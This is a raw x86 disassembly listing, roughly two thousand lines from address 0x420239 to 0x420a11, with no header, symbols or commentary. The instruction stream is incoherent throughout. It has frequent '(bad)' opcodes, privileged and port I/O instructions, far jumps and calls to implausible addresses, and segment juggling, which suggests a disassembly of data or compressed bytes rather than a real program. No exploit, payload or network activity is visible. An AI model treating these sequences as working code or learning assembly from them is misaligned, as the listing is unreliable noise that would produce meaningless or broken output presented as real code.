  420239:	mov    ds:0xcbf29319,al
  42023e:	jp     0x42023b
  420240:	out    dx,eax
  420241:	push   ebx
  420242:	bts    DWORD PTR [ebp+0x7ffdd20b],edx
  420249:	lds    ebx,FWORD PTR [ecx]
  42024b:	lahf   
  42024c:	mov    esi,ds
  42024e:	cs mov ecx,0xa5d6ba1c
  420254:	jo     0x42023f
  420256:	xor    BYTE PTR [esp+edi*2+0x3c1ac463],0xfb
  42025e:	push   esi
  42025f:	and    eax,0x2679439f
  420264:	fsub   DWORD PTR ds:0x50b47b77
  42026a:	mov    dh,0xb9
  42026c:	ins    DWORD PTR es:[edi],dx
  42026d:	mov    cl,0x15
  42026f:	repnz icebp 
  420271:	and    eax,0x51ba0b49
  420276:	and    al,0xf3
  420278:	gs or  eax,0xf0dfee82
  42027e:	xor    al,0x6
  420280:	imul   edi,DWORD PTR [eax+0x15],0xffffffa2
  420284:	ja     0x4202e2
  420286:	jge    0x4202bb
  420288:	jno    0x42028c
  42028a:	jge    0x4202f9
  42028c:	cmc    
  42028d:	mov    bl,bl
  42028f:	mov    ah,0x7b
  420291:	sti    
  420292:	sub    BYTE PTR [esi+0x61],0x1e
  420296:	add    bh,0x5b
  420299:	or     eax,0xc8023595
  42029e:	adc    eax,0xfcf8d680
  4202a3:	jmp    0x7623fd7e
  4202a8:	adc    eax,DWORD PTR [esi-0x60]
  4202ab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4202ac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4202ad:	and    eax,0xb242038d
  4202b2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4202b3:	inc    eax
  4202b4:	sub    esi,DWORD PTR [esi]
  4202b6:	mov    ch,0xa2
  4202b8:	fidivr WORD PTR [edx-0x6c]
  4202bb:	pushf  
  4202bc:	popf   
  4202bd:	popf   
  4202be:	dec    edi
  4202bf:	inc    edi
  4202c0:	scas   eax,DWORD PTR es:[edi]
  4202c1:	fisttp QWORD PTR [eax-0x16]
  4202c5:	stos   DWORD PTR es:[edi],eax
  4202c6:	add    edx,ecx
  4202c8:	jno    0x420344
  4202ca:	lods   al,BYTE PTR ds:[esi]
  4202cb:	retf   0xd2b8
  4202ce:	loop   0x420320
  4202d0:	loope  0x42027b
  4202d2:	inc    ebx
  4202d3:	add    al,0x31
  4202d5:	out    0xe8,eax
  4202d7:	stos   DWORD PTR es:[edi],eax
  4202d8:	or     BYTE PTR [ebp+0x2eee04ca],ah
  4202de:	pop    ds
  4202df:	mov    eax,0xd4e1c65d
  4202e4:	jg     0x4202b6
  4202e6:	xchg   DWORD PTR [esi],edi
  4202e8:	test   BYTE PTR [ecx-0xc9a8718],ah
  4202ee:	icebp  
  4202ef:	add    eax,0x55518125
  4202f4:	es js  0x4202d6
  4202f7:	and    DWORD PTR [edi],edi
  4202f9:	xchg   BYTE PTR [eax+0x2b],bh
  4202fc:	mov    BYTE PTR [edx],ch
  4202fe:	inc    esi
  4202ff:	shl    BYTE PTR [ecx+ecx*4+0x59],cl
  420303:	jb     0x420300
  420305:	pop    es
  420306:	mov    bl,0xee
  420308:	cmp    al,0xed
  42030a:	imul   ecx,DWORD PTR fs:[esi+0x67595190],0xa6aab4b5
  420315:	push   ds
  420316:	jne    0x42036d
  420318:	mov    bh,0x7
  42031a:	add    al,0x41
  42031c:	outs   dx,DWORD PTR ds:[esi]
  42031d:	stos   DWORD PTR es:[edi],eax
  42031e:	shl    BYTE PTR [ebx-0x736c64c9],1
  420324:	cmp    eax,eax
  420326:	fwait
  420327:	sbb    BYTE PTR [ebx-0x4b0a0e0e],0x4b
  42032e:	or     ebx,DWORD PTR [eax+0x21]
  420331:	cdq    
  420332:	sbb    ah,BYTE PTR [esi]
  420334:	clc    
  420335:	repnz sbb DWORD PTR [ebp+0x67fb1362],eax
  42033c:	cwde   
  42033d:	mov    ecx,0x1ad3931f
  420342:	cmp    edi,DWORD PTR [esi+esi*4]
  420345:	sar    edx,0x96
  420348:	rol    BYTE PTR [edi+0x51],1
  42034b:	sub    BYTE PTR [edx+esi*4+0x1d],dl
  42034f:	jns    0x42032f
  420351:	push   ss
  420352:	(bad)  
  420353:	sbb    esi,DWORD PTR [edx-0x6]
  420356:	ret    0x4652
  420359:	fwait
  42035a:	sti    
  42035b:	mov    dh,0x4a
  42035d:	aaa    
  42035e:	and    ecx,DWORD PTR [edx]
  420360:	out    0xe2,eax
  420362:	jmp    0xc0fb8529
  420367:	xor    eax,0x2be4522b
  42036c:	push   esp
  42036d:	mov    gs:0x222b5256,eax
  420373:	jp     0x420359
  420375:	outs   dx,BYTE PTR ds:[esi]
  420376:	dec    ecx
  420377:	pop    ebx
  420378:	mov    al,BYTE PTR [ebx]
  42037a:	enter  0x8dfa,0xe6
  42037e:	aam    0xb4
  420380:	sub    BYTE PTR [ecx+0x3f],al
  420383:	push   ecx
  420384:	js     0x4203b1
  420386:	mov    ebx,0xf27c71a4
  42038b:	adc    al,0x6
  42038d:	es jne 0x420351
  420390:	inc    esi
  420391:	fisubr DWORD PTR [ebx+0xd59d036]
  420397:	lock ds (bad) 
  42039a:	mov    ebx,0xde89427d
  42039f:	adc    ah,BYTE PTR [ecx-0x65]
  4203a2:	lods   eax,DWORD PTR ds:[esi]
  4203a3:	bound  esp,QWORD PTR [edi]
  4203a5:	pop    ebp
  4203a6:	push   edx
  4203a7:	inc    edi
  4203a8:	jle    0x4203dd
  4203aa:	xor    al,0xee
  4203ac:	mov    al,ds:0x150ccf1f
  4203b1:	mov    edx,0xce8a1894
  4203b6:	aas    
  4203b7:	stos   DWORD PTR es:[edi],eax
  4203b8:	lea    ebp,[eax+edi*2-0x74]
  4203bc:	repz retf 0xec60
  4203c0:	cmp    DWORD PTR [ebx+0x1db9fd78],0xb1eb479d
  4203ca:	test   BYTE PTR [ebx+0x648d2559],ah
  4203d0:	arpl   WORD PTR [esi+0x28],bp
  4203d3:	shl    BYTE PTR cs:[ebp-0x2d10ff00],cl
  4203da:	jmp    0xf649cd0d
  4203df:	mov    DWORD PTR [esp+edi*1],eax
  4203e2:	sbb    eax,0x55d8dcd0
  4203e7:	cmp    ecx,DWORD PTR [esi+0x23]
  4203ea:	js     0x420397
  4203ec:	xchg   ecx,eax
  4203ed:	inc    ebp
  4203ee:	push   esp
  4203ef:	inc    edi
  4203f0:	dec    ecx
  4203f1:	(bad)  
  4203f2:	and    DWORD PTR [edi-0x67],edx
  4203f5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4203f6:	pop    ss
  4203f7:	jl     0x420428
  4203f9:	mov    dl,0x89
  4203fb:	(bad)  
  4203fc:	or     bl,BYTE PTR [ebx+edx*2+0x72a1a6b5]
  420403:	imul   esp,ebp,0xe8b2af0f
  420409:	repz sub di,WORD PTR [esi]
  42040d:	inc    ebx
  42040e:	xor    dl,bh
  420410:	xchg   dh,dl
  420412:	cmc    
  420413:	xor    al,0x1f
  420415:	hlt    
  420416:	(bad)  
  420418:	ss loop 0x42042e
  42041b:	frndint 
  42041d:	popf   
  42041e:	in     al,dx
  42041f:	mov    esi,0x9b0d30b7
  420424:	mov    al,ds:0x486b4ba0
  420429:	inc    eax
  42042a:	loope  0x42043b
  42042c:	int3   
  42042d:	cmp    dl,BYTE PTR [edi-0x23]
  420430:	aaa    
  420431:	pusha  
  420432:	mov    esp,0x5fa44791
  420437:	hlt    
  420438:	inc    ebx
  420439:	or     al,0x8
  42043b:	mov    cl,0x74
  42043d:	cmc    
  42043e:	sub    BYTE PTR [edi+0x4b],al
  420441:	mov    ch,0xc7
  420443:	push   ds
  420444:	add    dh,BYTE PTR [ebx+0x2a]
  420447:	mov    ah,0x37
  420449:	xchg   ebp,eax
  42044a:	cmp    DWORD PTR ss:[edx+0x1e],ebx
  42044e:	jb     0x42049a
  420450:	int3   
  420451:	adc    DWORD PTR [eax+0x11a47023],ebx
  420457:	mov    dl,0x72
  420459:	lock arpl ax,si
  42045c:	enter  0x45a3,0x32
  420460:	add    esp,0xffffff89
  420463:	pop    ebx
  420464:	rcl    bl,cl
  420466:	jmp    0x3da4c12e
  42046b:	hlt    
  42046c:	int3   
  42046d:	sbb    al,ch
  42046f:	adc    DWORD PTR [eax],ebx
  420471:	pop    esp
  420472:	popf   
  420473:	add    DWORD PTR [esi],ecx
  420475:	xor    al,BYTE PTR [ebx+0x59]
  420478:	mov    cl,0xba
  42047a:	(bad)  
  42047b:	push   eax
  42047c:	xor    ch,al
  42047e:	mov    ah,BYTE PTR [ebx]
  420480:	(bad)  
  420481:	mov    ebp,0xda0cc912
  420486:	into   
  420487:	xchg   esi,eax
  420488:	lds    edx,FWORD PTR [eax-0x6ea68675]
  42048e:	add    al,0xbf
  420490:	mov    ah,0xe0
  420492:	push   ss
  420493:	sbb    eax,0x263bb783
  420498:	das    
  420499:	mov    dh,0x47
  42049b:	ret    0x18d9
  42049e:	mov    bl,0xe0
  4204a0:	gs nop
  4204a2:	call   0xa9f2:0x4d92f94e
  4204a9:	neg    ebx
  4204ab:	xor    DWORD PTR [esi],edi
  4204ad:	xchg   edx,eax
  4204ae:	mov    es,WORD PTR [ecx+0x4e8933f4]
  4204b4:	lods   al,BYTE PTR ds:[esi]
  4204b5:	in     eax,dx
  4204b6:	in     al,0x2e
  4204b8:	push   eax
  4204b9:	leave  
  4204ba:	pusha  
  4204bb:	jbe    0x42050d
  4204bd:	loope  0x420506
  4204bf:	arpl   WORD PTR [edi+0x1b063e66],bx
  4204c5:	mov    cl,0xde
  4204c7:	push   es
  4204c8:	mov    ds:0x6c92bbe9,al
  4204cd:	aam    0xb1
  4204cf:	ret    0xd5a7
  4204d2:	mov    ah,0xe
  4204d4:	das    
  4204d5:	push   ecx
  4204d6:	rcl    DWORD PTR [ecx+0x3a],0x62
  4204da:	mov    ebx,0x88236f1c
  4204df:	push   ds
  4204e0:	fxch   st(7)
  4204e2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4204e3:	sub    al,0x50
  4204e5:	dec    ecx
  4204e6:	dec    ecx
  4204e7:	inc    edx
  4204e8:	mov    dl,0x8d
  4204ea:	pop    ecx
  4204eb:	jl     0x420489
  4204ed:	scas   al,BYTE PTR es:[edi]
  4204ee:	mov    ch,cl
  4204f0:	sahf   
  4204f1:	inc    ebx
  4204f2:	bound  ebp,QWORD PTR [ebx+0x43]
  4204f5:	aas    
  4204f6:	sub    al,0x29
  4204f8:	xchg   edi,eax
  4204f9:	cmp    BYTE PTR [eax],dh
  4204fb:	aad    0xd8
  4204fd:	add    ch,BYTE PTR [edx+0x61]
  420500:	out    dx,al
  420501:	das    
  420502:	lock xchg edi,eax
  420504:	push   ebp
  420505:	jmp    0x415fb49c
  42050a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42050b:	add    ebx,edi
  42050d:	aad    0xd8
  42050f:	lods   eax,DWORD PTR ds:[esi]
  420510:	popf   
  420511:	sbb    DWORD PTR [ecx-0x2f05a674],eax
  420517:	dec    edi
  420518:	mov    dh,0x1d
  42051a:	mov    al,ds:0xf8b162e6
  42051f:	cmp    eax,DWORD PTR [edi+0x1cebaf42]
  420525:	sahf   
  420526:	xor    BYTE PTR [edi+edx*4],al
  420529:	sti    
  42052a:	sub    ecx,DWORD PTR [esi-0x48]
  42052d:	jbe    0x420595
  42052f:	xor    al,0xf7
  420531:	pop    edx
  420532:	sub    eax,0x59b31003
  420537:	cmc    
  420538:	xchg   DWORD PTR [edx+ecx*8+0x26],ebx
  42053c:	push   ds
  42053d:	mov    ch,0x27
  42053f:	pop    ecx
  420540:	adc    BYTE PTR [eax],cl
  420542:	sbb    DWORD PTR [ebp-0x25],esp
  420545:	stos   BYTE PTR es:[edi],al
  420546:	in     al,0x4c
  420548:	clc    
  420549:	mov    bh,BYTE PTR [esi]
  42054b:	cmp    esp,esp
  42054d:	cli    
  42054e:	pop    esi
  42054f:	add    eax,0xe8c1ea1f
  420554:	jne    0x420556
  420556:	pusha  
  420557:	stos   BYTE PTR es:[edi],al
  420558:	shl    esp,1
  42055a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42055b:	out    dx,al
  42055c:	mov    ds:0x463988ee,eax
  420561:	jae    0x420533
  420563:	ud2    
  420565:	jb     0x4205d3
  420567:	inc    edx
  420568:	xchg   DWORD PTR [edx],ebp
  42056a:	lea    ebp,[ebx-0x1d]
  42056d:	cmp    DWORD PTR [eax],ebx
  42056f:	shl    BYTE PTR [eax-0x1fbfedf5],0xa7
  420576:	ins    BYTE PTR es:[edi],dx
  420577:	fucomip st,st(6)
  420579:	ins    DWORD PTR es:[edi],dx
  42057a:	jo     0x42054a
  42057c:	pop    ss
  42057d:	imul   esi,DWORD PTR [edx+ebx*4-0x17bf12ae],0x34cfd719
  420588:	es daa 
  42058a:	add    BYTE PTR [ecx+0x22],cl
  42058d:	cmp    DWORD PTR [edi-0x69ff8b02],edi
  420593:	lock in al,0x96
  420596:	sub    ah,BYTE PTR [edx-0x4fcb97e0]
  42059c:	loope  0x4205a3
  42059e:	mov    edi,DWORD PTR [esi-0x27ea4ec5]
  4205a4:	lods   eax,DWORD PTR ds:[esi]
  4205a5:	xor    eax,0x11a3c7a
  4205aa:	sbb    DWORD PTR [esi],esi
  4205ac:	cmp    DWORD PTR [edi],ebx
  4205ae:	shl    DWORD PTR [ecx],1
  4205b0:	rcr    BYTE PTR [eax-0x530c57a9],0xf8
  4205b7:	pop    edx
  4205b8:	cld    
  4205b9:	inc    esi
  4205ba:	mov    esi,0x39326a67
  4205bf:	outs   dx,DWORD PTR ds:[esi]
  4205c0:	sti    
  4205c1:	jle    0x420549
  4205c3:	int3   
  4205c4:	add    eax,0xe1902f76
  4205c9:	xlat   BYTE PTR ds:[ebx]
  4205ca:	pop    ds
  4205cb:	out    dx,al
  4205cc:	inc    edx
  4205cd:	iret   
  4205ce:	pop    ebp
  4205cf:	mov    edx,eax
  4205d1:	cwde   
  4205d2:	test   DWORD PTR [edx],0x4484a8fa
  4205d8:	xor    DWORD PTR ds:0x4b7b5add,ebx
  4205de:	enter  0xf8ed,0x85
  4205e2:	fwait
  4205e3:	push   ebp
  4205e4:	sub    bl,BYTE PTR [ecx-0x54]
  4205e7:	jns    0x42056d
  4205e9:	add    al,BYTE PTR [esi+0x3]
  4205ec:	cs mov cl,0xbd
  4205ef:	cmp    ah,bh
  4205f1:	dec    edx
  4205f2:	fdivrp st(3),st
  4205f4:	popa   
  4205f5:	enter  0x291c,0xc7
  4205f9:	ror    BYTE PTR [esi],1
  4205fb:	jmp    0xf2ce:0x7b823a2b
  420602:	std    
  420603:	enter  0x560c,0xb4
  420607:	int3   
  420608:	mov    edi,0x9ff19a11
  42060d:	sbb    DWORD PTR ds:0x713a4fc6,ebx
  420613:	(bad)  
  420615:	outs   dx,BYTE PTR ds:[esi]
  420616:	sub    al,0x4e
  420618:	push   ds
  420619:	mov    esp,0xc7e7a94f
  42061e:	mov    bh,0x13
  420620:	stos   DWORD PTR es:[edi],eax
  420621:	cmp    ecx,ecx
  420623:	inc    edx
  420624:	fldcw  WORD PTR [edx]
  420626:	inc    edi
  420627:	mov    bh,0x5e
  420629:	ja     0x4206a2
  42062b:	lods   eax,DWORD PTR ds:[esi]
  42062c:	dec    eax
  42062d:	mov    eax,ds:0x13a5f91e
  420632:	jle    0x420670
  420634:	cwde   
  420635:	(bad)  
  420637:	cmp    eax,0x8d1db536
  42063c:	out    dx,eax
  42063d:	fadd   st,st(1)
  42063f:	xchg   ebp,eax
  420640:	neg    BYTE PTR [ebp+0x4c]
  420643:	mov    esp,0x2362ba71
  420648:	sbb    dl,ch
  42064a:	sbb    bh,bh
  42064c:	fstp   QWORD PTR [ebx-0x31c801ac]
  420652:	fisttp DWORD PTR [esi+0x19aaac5]
  420658:	adc    al,0x49
  42065a:	in     eax,dx
  42065b:	stos   BYTE PTR es:[edi],al
  42065c:	int    0xb0
  42065e:	sbb    eax,DWORD PTR [ebx+ecx*1+0x68]
  420662:	test   BYTE PTR ds:0xe2fbef6b,al
  420668:	jo     0x420690
  42066a:	mul    esi
  42066c:	das    
  42066d:	and    al,0x8
  42066f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420670:	xchg   esi,eax
  420671:	je     0x420656
  420673:	in     eax,dx
  420674:	rcr    DWORD PTR [esi+edi*8+0x7b],0x28
  420679:	add    DWORD PTR [eax-0x63],edi
  42067c:	push   0xffffffe5
  42067e:	inc    DWORD PTR [edi-0x1a2fadfa]
  420684:	repz inc esi
  420686:	jae    0x4206dd
  420688:	mov    dl,0xcb
  42068a:	dec    ebx
  42068b:	ficomp DWORD PTR [ebx-0x40]
  42068e:	push   esi
  42068f:	inc    ecx
  420690:	leave  
  420691:	or     dh,BYTE PTR [eax-0x26]
  420694:	mov    ?,WORD PTR [eax+0x76]
  420697:	lea    esi,[bp+si-0x6f]
  42069b:	shl    ebx,1
  42069d:	mov    BYTE PTR [eax+0x4b8bef94],dh
  4206a3:	pop    esp
  4206a4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4206a5:	outs   dx,BYTE PTR ds:[esi]
  4206a6:	neg    DWORD PTR [esi+0x7]
  4206a9:	rcr    bh,1
  4206ab:	in     al,0xd4
  4206ad:	ror    DWORD PTR [ebx+0x4c],1
  4206b0:	fcmovu st,st(6)
  4206b2:	adc    ch,ch
  4206b4:	scas   al,BYTE PTR es:[edi]
  4206b5:	mov    dh,0x1b
  4206b7:	or     ah,dl
  4206b9:	jns    0x4206bb
  4206bb:	sub    DWORD PTR [ebx+edx*1+0x2e],esi
  4206bf:	test   al,0xe6
  4206c1:	test   BYTE PTR [esp+edi*2+0x310b45e],al
  4206c8:	jae    0x4206d7
  4206ca:	xor    BYTE PTR ds:0xc0b65443,dl
  4206d0:	mov    eax,DWORD PTR [edx+0x2b]
  4206d3:	pop    esi
  4206d4:	xor    DWORD PTR [edi-0x18],edi
  4206d7:	js     0x420681
  4206d9:	fldlg2 
  4206db:	mov    ah,0x8c
  4206dd:	repnz cmp DWORD PTR [edi],edi
  4206e0:	fidivr DWORD PTR [ebx]
  4206e2:	push   edi
  4206e3:	das    
  4206e4:	popf   
  4206e5:	xor    ah,bl
  4206e7:	sbb    BYTE PTR [ecx-0x21d8f318],ah
  4206ed:	ret    0xbcea
  4206f0:	test   al,0xd3
  4206f2:	inc    edx
  4206f3:	out    0x5d,eax
  4206f5:	xlat   BYTE PTR ds:[ebx]
  4206f6:	add    BYTE PTR [ecx-0x4b614cd0],ch
  4206fc:	xor    ch,BYTE PTR [edx]
  4206fe:	(bad)  
  4206ff:	cs sti 
  420701:	adc    BYTE PTR [ecx-0x65],cl
  420704:	mov    ch,0xe0
  420706:	jnp    0x420737
  420708:	pop    ecx
  420709:	sbb    al,BYTE PTR [esi]
  42070b:	xchg   DWORD PTR [esi+ecx*4],esp
  42070e:	pop    es
  42070f:	pusha  
  420710:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420711:	repnz adc DWORD PTR [esi],0x51
  420715:	loop   0x420751
  420717:	cdq    
  420718:	jbe    0x4206ad
  42071a:	add    BYTE PTR gs:[si-0x4e],dl
  42071f:	inc    edx
  420720:	enter  0xd547,0xc3
  420724:	out    0x92,al
  420726:	and    esi,edi
  420728:	inc    esi
  420729:	dec    edi
  42072a:	ins    BYTE PTR es:[edi],dx
  42072b:	mov    ah,0xae
  42072d:	adc    dl,BYTE PTR gs:[edx-0x26287184]
  420734:	sub    al,0xbc
  420736:	sbb    eax,0x88733e09
  42073b:	ret    0x44d6
  42073e:	test   al,0xcb
  420740:	xchg   edx,eax
  420741:	popa   
  420742:	cmp    BYTE PTR [ebx+edx*1],cl
  420745:	jg     0x4206d4
  420747:	or     esp,0xf9db6365
  42074d:	dec    ecx
  42074e:	retf   0x459e
  420751:	jecxz  0x420747
  420753:	push   ecx
  420754:	je     0x420786
  420756:	mov    ebx,ecx
  420758:	div    BYTE PTR [ebx+0x5f26f988]
  42075e:	call   0x1c5366c4
  420763:	dec    edx
  420764:	jp     0x42076b
  420766:	xlat   BYTE PTR ds:[ebx]
  420767:	xchg   esp,eax
  420768:	imul   BYTE PTR [edi+0x37279bd8]
  42076e:	(bad)  
  42076f:	out    dx,eax
  420770:	dec    ecx
  420771:	mov    ah,0x9e
  420773:	push   ebp
  420774:	and    DWORD PTR [edi-0x5f7fbf62],0x74
  42077b:	adc    al,0x75
  42077d:	cwde   
  42077e:	push   ds
  42077f:	xchg   esp,eax
  420780:	sub    DWORD PTR [edx-0x51f9c16a],esp
  420786:	sub    eax,0xd1d7ca09
  42078b:	jbe    0x4207e8
  42078d:	cmc    
  42078e:	mov    eax,ds:0x608c5fe8
  420793:	fdiv   QWORD PTR [edi-0x18]
  420796:	ds jmp 0x42080e
  420799:	jo     0x420789
  42079b:	or     DWORD PTR [edx-0x683e5d29],ebp
  4207a1:	lods   eax,DWORD PTR ds:[esi]
  4207a2:	rcr    DWORD PTR ds:0x9beaee1c,1
  4207a8:	test   eax,0x7f3528aa
  4207ad:	sub    bl,BYTE PTR [edi+0xc]
  4207b0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4207b1:	ret    0x3658
  4207b4:	mov    ds:0x27fdef4d,eax
  4207b9:	xor    eax,0x72ad4f74
  4207be:	and    ecx,DWORD PTR [edi-0x3a]
  4207c1:	jmp    0x420786
  4207c3:	clc    
  4207c4:	sub    eax,0xa4e0c959
  4207c9:	imul   esi,DWORD PTR [edx],0xffffffba
  4207cc:	stos   BYTE PTR es:[edi],al
  4207cd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4207ce:	push   ebp
  4207cf:	xchg   ebp,eax
  4207d0:	and    DWORD PTR [edi+0x2bb280ee],ebp
  4207d6:	fistp  QWORD PTR [edi+0x49b00df8]
  4207dc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4207dd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4207de:	fwait
  4207df:	dec    esp
  4207e0:	jo     0x42082f
  4207e2:	jg     0x420787
  4207e4:	repz adc ah,BYTE PTR [ebx-0xd]
  4207e8:	fstp   TBYTE PTR [esi+0x460033ba]
  4207ee:	push   ds
  4207ef:	leave  
  4207f0:	daa    
  4207f1:	icebp  
  4207f2:	mov    DWORD PTR [esi-0x3b8375df],0xe63c940f
  4207fc:	loop   0x42085d
  4207fe:	sti    
  4207ff:	push   esi
  420800:	pop    ss
  420801:	mov    esi,0xbc41f719
  420806:	retf   
  420807:	xchg   esp,eax
  420808:	(bad)  
  420809:	mov    ah,0x4
  42080b:	fsub   DWORD PTR [ecx+edi*8-0x49]
  42080f:	xchg   esi,eax
  420810:	push   0xdf04caa4
  420815:	imul   ebp,ecx,0xd42f14da
  42081b:	mov    ebx,0xceb9c1a1
  420820:	jmp    0x9774:0xfef6369f
  420827:	ret    
  420828:	sbb    al,0x27
  42082a:	and    bh,BYTE PTR [eax-0x31]
  42082d:	add    esp,DWORD PTR [edi+edx*1]
  420830:	sub    ch,cl
  420832:	cmp    DWORD PTR [edi+0x3b14adad],esp
  420838:	sbb    BYTE PTR [ebx-0x12d959de],0xc7
  42083f:	sbb    DWORD PTR [esi+0x32],esi
  420842:	call   0x8f3b0cc7
  420847:	mov    al,ds:0xc0962db8
  42084c:	inc    ebx
  42084d:	int    0xc8
  42084f:	dec    si
  420851:	ss (bad) 
  420853:	xor    ah,ch
  420855:	push   esi
  420856:	mov    cl,0xd7
  420858:	and    al,0xcb
  42085a:	loop   0x4207e2
  42085c:	ret    0xfb3c
  42085f:	iret   
  420860:	or     eax,0xced5b8b5
  420865:	pop    es
  420866:	push   0xd0d83b54
  42086b:	daa    
  42086c:	pop    ecx
  42086d:	dec    BYTE PTR [edi]
  42086f:	fisttp QWORD PTR [eax+0x5a]
  420872:	shl    ebx,0x57
  420875:	xor    eax,0x4cf04612
  42087a:	imul   edi,eax,0x9289d3ac
  420880:	cmc    
  420881:	mov    edi,0x6ccf2998
  420886:	in     eax,dx
  420887:	push   esp
  420888:	imul   esi,DWORD PTR [ecx+0x2e4aefe9],0xc9bac998
  420892:	adc    esp,esi
  420894:	pushf  
  420895:	mov    ds:0xc75e338,eax
  42089a:	xchg   DWORD PTR [ecx-0x5c73fdfc],esp
  4208a0:	push   edi
  4208a1:	cmc    
  4208a2:	(bad)  [ecx-0x3c]
  4208a5:	mov    eax,0xdfcd3dba
  4208aa:	push   es
  4208ab:	outs   dx,BYTE PTR ds:[esi]
  4208ac:	mov    esp,0xd5559536
  4208b1:	pushf  
  4208b2:	dec    ebp
  4208b3:	enter  0x9d5f,0x8b
  4208b7:	jmp    0x37b45d7a
  4208bc:	out    dx,eax
  4208bd:	repz inc edi
  4208bf:	mov    dh,0x8d
  4208c1:	in     al,0x2e
  4208c3:	jno    0x420885
  4208c5:	lds    esi,FWORD PTR [ecx]
  4208c7:	int    0x58
  4208c9:	pextrw esi,mm5,0x77
  4208cd:	mov    ah,0x6f
  4208cf:	cwde   
  4208d0:	pcmpgtd mm2,QWORD PTR [ebp*2+0x202a11f8]
  4208d8:	(bad)  
  4208d9:	aam    0x46
  4208db:	(bad)  
  4208dc:	cmc    
  4208dd:	mov    ebx,0xd2ba6948
  4208e2:	add    al,BYTE PTR [esi+esi*8]
  4208e5:	test   al,0xa7
  4208e7:	mov    ebx,0xc0d380c8
  4208ec:	in     eax,dx
  4208ed:	daa    
  4208ee:	addr16 add dh,dl
  4208f1:	jle    0x4208ee
  4208f3:	adc    DWORD PTR [ebp+0x50b33605],edi
  4208f9:	xor    edi,DWORD PTR [esi+0x73ff2b1f]
  4208ff:	xor    dl,BYTE PTR [ecx+0x4e]
  420902:	adc    al,0xe8
  420904:	aaa    
  420905:	int    0x3c
  420907:	sub    dl,BYTE PTR [ebx+0x6]
  42090a:	fdiv   QWORD PTR [ecx+ebx*8]
  42090d:	ss xchg ebp,eax
  42090f:	mov    al,ds:0x70e095d2
  420914:	dec    esp
  420915:	xchg   ebp,eax
  420916:	popa   
  420917:	xchg   edx,eax
  420918:	mov    ah,0x5d
  42091a:	loop   0x42096b
  42091c:	cmc    
  42091d:	fwait
  42091e:	cmp    DWORD PTR [ebp-0x6c7c1f5e],ebx
  420924:	fld    QWORD PTR ss:[edx+0x4c]
  420928:	jmp    0x420911
  42092a:	mov    ebx,0xa80ea947
  42092f:	dec    esp
  420930:	sbb    al,0xd6
  420932:	or     ebp,DWORD PTR [ecx+eiz*1]
  420935:	cs push 0xd961bd3e
  42093b:	jl     0x420988
  42093d:	push   esp
  42093e:	aad    0xee
  420940:	pop    eax
  420941:	ss out 0xa,eax
  420944:	ror    ah,cl
  420946:	mov    eax,0xcf8df420
  42094b:	(bad)  
  42094c:	and    DWORD PTR [edx-0x3b],eax
  42094f:	push   ax
  420951:	int    0x8b
  420953:	adc    edx,DWORD PTR [eax+ecx*8-0x7b528a58]
  42095a:	imul   esi,DWORD PTR [eax-0x54dd4032],0xfffffff3
  420961:	sbb    eax,0xd68425d4
  420966:	or     BYTE PTR [esi-0x46],al
  420969:	inc    edx
  42096a:	adc    DWORD PTR [edx+esi*4],esp
  42096d:	adc    cl,BYTE PTR [edx+0x2]
  420970:	add    eax,0xb3a34ded
  420975:	push   edi
  420976:	(bad)  
  420977:	mov    ecx,0x459b3f0
  42097c:	cli    
  42097d:	(bad)  [ebp+0x21]
  420980:	gs jb  0x420963
  420983:	mov    al,ds:0x8b1471a9
  420988:	aas    
  420989:	out    0xae,al
  42098b:	xlat   BYTE PTR ds:[ebx]
  42098c:	push   ebx
  42098d:	je     0x420952
  42098f:	pop    es
  420990:	int3   
  420991:	inc    ebx
  420992:	xchg   edi,eax
  420993:	cdq    
  420994:	aad    0x18
  420996:	dec    ebx
  420997:	call   0xf9f6e2a8
  42099c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42099d:	fucom  st(1)
  42099f:	xchg   esi,eax
  4209a0:	rcl    DWORD PTR [eax+0x4b7e6222],0x29
  4209a7:	shl    DWORD PTR [ebp+0xd887d3e],0x22
  4209ae:	aam    0x85
  4209b0:	dec    eax
  4209b1:	out    dx,al
  4209b2:	jmp    0xf98c801f
  4209b7:	imul   ebx,DWORD PTR [ecx],0xfff3407a
  4209bd:	dec    esp
  4209be:	push   es
  4209bf:	pop    ds
  4209c0:	popf   
  4209c1:	sub    ebp,DWORD PTR [edx+0x1f9e0560]
  4209c7:	push   ecx
  4209c8:	jp     0x42099b
  4209ca:	gs in  eax,0x12
  4209cd:	rol    bh,0x56
  4209d0:	push   ds
  4209d1:	sbb    DWORD PTR [eax-0x6d],esi
  4209d4:	push   ds
  4209d5:	xor    cl,dl
  4209d7:	jne    0x420999
  4209d9:	loop   0x420a14
  4209db:	jo     0x4209b0
  4209dd:	mov    dh,bl
  4209df:	aas    
  4209e0:	jp     0x420975
  4209e2:	loop   0x420a28
  4209e4:	dec    esp
  4209e5:	fstp   TBYTE PTR [ebx+0x6fceb280]
  4209eb:	sub    BYTE PTR [ebx],bh
  4209ed:	mov    eax,ebx
  4209ef:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4209f0:	and    eax,ebx
  4209f2:	(bad)  
  4209f3:	outs   dx,BYTE PTR ds:[esi]
  4209f4:	or     dh,cl
  4209f6:	pop    es
  4209f7:	xchg   ecx,eax
  4209f8:	adc    al,0xff
  4209fa:	enter  0x553e,0x86
  4209fe:	sbb    eax,0x3a36e906
  420a03:	push   ebx
  420a04:	int    0xeb
  420a06:	jno    0x420a4b
  420a08:	lds    eax,FWORD PTR [edi]
  420a0a:	inc    esp
  420a0b:	push   ds
  420a0c:	mov    eax,ds:0x136fc7c2
  420a11:	test   al,0xf9
